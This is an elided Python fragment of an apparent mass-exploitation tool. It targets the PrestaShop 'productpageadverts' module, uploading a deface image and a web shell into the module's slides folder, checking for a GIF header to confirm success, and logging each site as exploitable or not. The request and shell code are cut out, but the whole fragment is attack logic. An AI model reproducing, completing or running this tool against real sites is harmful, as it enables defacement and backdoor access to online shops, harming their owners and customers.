...
def Exploit(site):
    try:
        ...
        if 'success' in GoT.content:
            IndexPath = '/modules/productpageadverts/slides/' + Jce_Deface_image.split('/')[1]
            ...
            if 'GIF89a' in CheckIndex.content:
                ...
                ShellPath = '/modules/productpageadverts/slides/' + ShellPresta.split('/')[1]
                ...
                return printModule.returnYes(site, 'N/A', 'productpageadverts Module', 'Prestashop')
            else:
                return printModule.returnNo(site, 'N/A', 'productpageadverts Module', 'Prestashop')
        else:
            return printModule.returnNo(site, 'N/A', 'productpageadverts Module', 'Prestashop')
    except:
        return printModule.returnNo(site, 'N/A', 'productpageadverts Module', 'Prestashop')
